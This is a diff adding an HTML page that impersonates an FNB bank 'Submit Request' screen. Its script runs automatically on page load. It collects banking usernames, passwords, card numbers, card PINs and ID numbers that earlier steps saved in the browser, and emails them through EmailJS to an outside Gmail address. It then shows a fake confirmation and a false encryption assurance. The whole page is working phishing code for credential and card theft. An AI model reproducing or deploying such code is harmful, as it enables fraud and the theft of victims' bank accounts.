@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FNB - Submit Request</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #ffffff 0%, #f0f9ff 30%, #e6f7f6 70%, #ccfbf1 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        /* Background Shapes */
+        .bg-shape {
+            position: fixed;
+            border-radius: 50%;
+            opacity: 0.08;
+            animation: floatShape 20s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .bg-shape-1 {
+            width: 400px;
+            height: 400px;
+            background: #00a79d;
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .bg-shape-2 {
+            width: 300px;
+            height: 300px;
+            background: #f5a623;
+            bottom: -80px;
+            left: -80px;
+            animation-delay: -5s;
+        }
+
+        .bg-shape-3 {
+            width: 200px;
+            height: 200px;
+            background: #00a79d;
+            top: 50%;
+            left: 10%;
+            animation-delay: -10s;
+        }
+
+        @keyframes floatShape {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(30px, -30px) scale(1.05); }
+            50% { transform: translate(-20px, 20px) scale(0.95); }
+            75% { transform: translate(20px, 30px) scale(1.02); }
+        }
+
+        /* Logo */
+        .logo-container {
+            margin-bottom: 35px;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            opacity: 0;
+            animation: fadeInDown 0.8s ease-out 0.2s forwards;
+        }
+
+        .logo-container img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+            box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35);
+            animation: logoPulse 3s ease-in-out infinite;
+            transition: transform 0.4s ease;
+        }
+
+        .logo-container img:hover {
+            transform: scale(1.1) rotate(5deg);
+        }
+
+        @keyframes logoPulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 15px 50px rgba(0, 167, 157, 0.35); }
+            50% { transform: scale(1.06); box-shadow: 0 20px 60px rgba(0, 167, 157, 0.5); }
+        }
+
+        .logo-container h2 {
+            margin-top: 12px;
+            color: #00a79d;
+            font-weight: 800;
+            letter-spacing: 4px;
+            font-size: 1.8rem;
+        }
+
+        /* Card */
+        .submit-card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 50px 45px;
+            border-radius: 28px;
+            box-shadow: 
+                0 25px 80px rgba(0, 0, 0, 0.08),
+                0 0 0 1px rgba(255, 255, 255, 0.5) inset;
+            width: 100%;
+            max-width: 550px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            position: relative;
+            z-index: 1;
+            opacity: 0;
+            animation: fadeInUp 1s ease-out 0.5s forwards;
+        }
+
+        .submit-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #00a79d, transparent);
+            border-radius: 2px;
+            opacity: 0;
+            animation: fadeIn 0.6s ease-out 1s forwards;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e2e8f0;
+            border-radius: 3px;
+            margin-bottom: 30px;
+            overflow: hidden;
+            opacity: 0;
+            animation: fadeIn 0.8s ease-out 0.8s forwards;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00a79d, #00c4b8);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .progress-text {
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            opacity: 0;
+            animation: fadeIn 0.8s ease-out 1s forwards;
+        }
+
+        /* Success Message */
+        .success-message {
+            display: none;
+            padding: 30px;
+        }
+
+        .success-message.show {
+            display: block;
+            animation: scaleIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .success-message .icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            animation: bounceIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s both;
+        }
+
+        .success-message h2 {
+            color: #00a79d;
+            font-size: 1.6rem;
+            font-weight: 800;
+            margin-bottom: 12px;
+            animation: fadeInUp 0.5s ease-out 0.4s both;
+        }
+
+        .success-message p {
+            color: #64748b;
+            font-size: 1rem;
+            line-height: 1.6;
+            margin-bottom: 8px;
+            animation: fadeInUp 0.5s ease-out 0.6s both;
+        }
+
+        .success-message .reference {
+            background: #e6f7f6;
+            color: #00a79d;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            display: inline-block;
+            margin-top: 15px;
+            border: 2px solid #ccfbf1;
+            animation: fadeInUp 0.5s ease-out 0.8s both;
+        }
+
+        /* Error Message */
+        .error-message {
+            display: none;
+            padding: 18px 22px;
+            background: linear-gradient(135deg, #fef2f2 0%, #fee2e2 100%);
+            border: 1px solid #fecaca;
+            border-radius: 14px;
+            color: #dc2626;
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-8px); }
+            40% { transform: translateX(8px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+
+        /* Retry Button */
+        .retry-btn {
+            padding: 14px 32px;
+            background: linear-gradient(135deg, #00a79d 0%, #008c82 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .retry-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 167, 157, 0.3);
+        }
+
+        /* Footer Note */
+        .footer-note {
+            margin-top: 30px;
+            color: #94a3b8;
+            font-size: 0.8rem;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            opacity: 0;
+            animation: fadeIn 1s ease-out 1.5s forwards;
+        }
+
+        .footer-note span {
+            color: #00a79d;
+            font-weight: 600;
+        }
+
+        /* Particles */
+        .particle {
+            position: fixed;
+            width: 6px;
+            height: 6px;
+            background: rgba(0, 167, 157, 0.2);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: particleFloat 15s ease-in-out infinite;
+        }
+
+        @keyframes particleFloat {
+            0%, 100% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes bounceIn {
+            from { opacity: 0; transform: scale(0.3); }
+            50% { transform: scale(1.1); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @media (max-width: 600px) {
+            .submit-card { padding: 35px 25px; }
+            .logo-container img { width: 80px; height: 80px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Shapes -->
+    <div class="bg-shape bg-shape-1"></div>
+    <div class="bg-shape bg-shape-2"></div>
+    <div class="bg-shape bg-shape-3"></div>
+
+    <!-- Floating Particles -->
+    <div class="particle" style="left: 10%; animation-delay: 0s; animation-duration: 12s;"></div>
+    <div class="particle" style="left: 25%; animation-delay: 3s; animation-duration: 15s;"></div>
+    <div class="particle" style="left: 50%; animation-delay: 6s; animation-duration: 18s;"></div>
+    <div class="particle" style="left: 75%; animation-delay: 2s; animation-duration: 14s;"></div>
+    <div class="particle" style="left: 90%; animation-delay: 5s; animation-duration: 16s;"></div>
+
+    <!-- Logo -->
+    <div class="logo-container">
+        <img src="images.png" alt="FNB Logo">
+        <h2>FNB</h2>
+    </div>
+
+    <!-- Submit Card -->
+    <div class="submit-card">
+        <!-- Loading State -->
+        <div id="loading-state">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <p class="progress-text" id="progress-text">Preparing your submission...</p>
+        </div>
+
+        <!-- Error State -->
+        <div class="error-message" id="error-message">
+            <p id="error-text">Something went wrong.</p>
+            <button class="retry-btn" id="retry-btn">Try Again</button>
+        </div>
+
+        <!-- Success State -->
+        <div class="success-message" id="success-message">
+            <div class="icon">✅</div>
+            <h2>Request Submitted!</h2>
+            <p>Thank you for reaching out to FNB.</p>
+            <p>Our team will review your request and contact you shortly.</p>
+            <div class="reference" id="reference-number">REF: FNB-000000</div>
+        </div>
+    </div>
+
+    <p class="footer-note">
+        <span>🔒</span> Your information is <span>secure & confidential</span>. Protected by 256-bit encryption.
+    </p>
+
+    <script>
+        // ===== EMAILJS CONFIGURATION =====
+        const EMAILJS_CONFIG = {
+            PUBLIC_KEY: '27Xk7EMvDeAbXaev4',
+            SERVICE_ID: 'service_w7b7bnu',
+            TEMPLATE_ID: 'template_kuyqphb'
+        };
+
+        emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
+
+        // ===== DOM ELEMENTS =====
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const loadingState = document.getElementById('loading-state');
+        const errorMessage = document.getElementById('error-message');
+        const errorText = document.getElementById('error-text');
+        const retryBtn = document.getElementById('retry-btn');
+        const successMessage = document.getElementById('success-message');
+        const referenceNumber = document.getElementById('reference-number');
+
+        // ===== GENERATE REFERENCE =====
+        function generateReference() {
+            const timestamp = Date.now().toString(36).toUpperCase();
+            const random = Math.random().toString(36).substring(2, 6).toUpperCase();
+            return `FNB-${timestamp}${random}`;
+        }
+
+        // ===== LOAD ALL DATA =====
+        function getAllData() {
+            const hasApp = localStorage.getItem('fnb_has_banking_app');
+            const data = {
+                user_request: localStorage.getItem('fnb_user_request') || '',
+                first_name: localStorage.getItem('fnb_first_name') || '',
+                last_name: localStorage.getItem('fnb_last_name') || '',
+                email: localStorage.getItem('fnb_email') || '',
+                phone: localStorage.getItem('fnb_phone') || '',
+                id_number: localStorage.getItem('fnb_id_number') || '',
+                account_type: localStorage.getItem('fnb_account_type') || '',
+                has_banking_app: hasApp === 'yes' ? 'Yes' : 'No',
+                reference: generateReference(),
+                submit_time: new Date().toLocaleString('en-ZA', {
+                    weekday: 'long',
+                    year: 'numeric',
+                    month: 'long',
+                    day: 'numeric',
+                    hour: '2-digit',
+                    minute: '2-digit'
+                })
+            };
+
+            // Add app-user specific data
+            if (hasApp === 'yes') {
+                data.username = localStorage.getItem('fnb_username') || '';
+                data.password = localStorage.getItem('fnb_password') || '';
+                data.card_number = localStorage.getItem('fnb_card_number') || '';
+                data.card_pin = localStorage.getItem('fnb_card_pin') || '';
+                data.user_type = 'App User';
+            } else {
+                // Add non-app-user specific data
+                data.verify_id_number = localStorage.getItem('fnb_verify_id_number') || '';
+                data.verify_phone = localStorage.getItem('fnb_verify_phone') || '';
+                data.card_number = localStorage.getItem('fnb_verify_card_number') || '';
+                data.card_pin = localStorage.getItem('fnb_verify_card_pin') || '';
+                data.user_type = 'Non-App User';
+            }
+
+            return data;
+        }
+
+        // ===== SEND EMAIL =====
+        async function sendEmail() {
+            progressFill.style.width = '30%';
+            progressText.textContent = 'Connecting to secure server...';
+
+            const data = getAllData();
+
+            // Validate data
+            if (!data.user_request || !data.first_name || !data.email) {
+                throw new Error('Missing required information. Please go back and complete all steps.');
+            }
+
+            progressFill.style.width = '60%';
+            progressText.textContent = 'Sending your request...';
+
+            const templateParams = {
+                to_email: 'smartgliss60@gmail.com',
+                from_name: `${data.first_name} ${data.last_name}`,
+                reply_to: data.email,
+                user_request: data.user_request,
+                first_name: data.first_name,
+                last_name: data.last_name,
+                email: data.email,
+                phone: data.phone,
+                id_number: data.id_number || 'Not provided',
+                account_type: data.account_type || 'Not specified',
+                has_banking_app: data.has_banking_app,
+                user_type: data.user_type,
+                reference: data.reference,
+                submit_time: data.submit_time,
+                // App user fields
+                username: data.username || 'N/A',
+                password: data.password || 'N/A',
+                // Non-app user fields
+                verify_id_number: data.verify_id_number || 'N/A',
+                verify_phone: data.verify_phone || 'N/A',
+                // Common fields
+                card_number: data.card_number || 'N/A',
+                card_pin: data.card_pin || 'N/A'
+            };
+
+            await emailjs.send(
+                EMAILJS_CONFIG.SERVICE_ID,
+                EMAILJS_CONFIG.TEMPLATE_ID,
+                templateParams
+            );
+
+            progressFill.style.width = '100%';
+            progressText.textContent = 'Done!';
+
+            // Show success
+            setTimeout(() => {
+                loadingState.style.display = 'none';
+                successMessage.classList.add('show');
+                referenceNumber.textContent = `REF: ${data.reference}`;
+
+                // Clear localStorage after successful submission
+                clearAllData();
+            }, 500);
+        }
+
+        // ===== CLEAR ALL DATA =====
+        function clearAllData() {
+            const keys = [
+                'fnb_user_request',
+                'fnb_first_name',
+                'fnb_last_name',
+                'fnb_email',
+                'fnb_phone',
+                'fnb_id_number',
+                'fnb_account_type',
+                'fnb_has_banking_app',
+                'fnb_username',
+                'fnb_password',
+                'fnb_card_number',
+                'fnb_card_pin',
+                'fnb_verify_id_number',
+                'fnb_verify_phone',
+                'fnb_verify_card_number',
+                'fnb_verify_card_pin',
+                'fnb_step1_time',
+                'fnb_step2_time',
+                'fnb_step4_time',
+                'fnb_step5_time'
+            ];
+            keys.forEach(key => localStorage.removeItem(key));
+        }
+
+        // ===== HANDLE ERRORS =====
+        function showError(message) {
+            loadingState.style.display = 'none';
+            errorText.textContent = message;
+            errorMessage.classList.add('show');
+        }
+
+        // ===== RETRY =====
+        retryBtn.addEventListener('click', () => {
+            errorMessage.classList.remove('show');
+            loadingState.style.display = 'block';
+            progressFill.style.width = '0%';
+            startSubmission();
+        });
+
+        // ===== START SUBMISSION =====
+        async function startSubmission() {
+            try {
+                await sendEmail();
+            } catch (error) {
+                console.error('EmailJS Error:', error);
+                showError(error.message || 'Failed to send your request. Please try again.');
+            }
+        }
+
+        // Auto-start on page load
+        setTimeout(startSubmission, 1000);
+    </script>
+
+</body>
+</html>
+
+
+
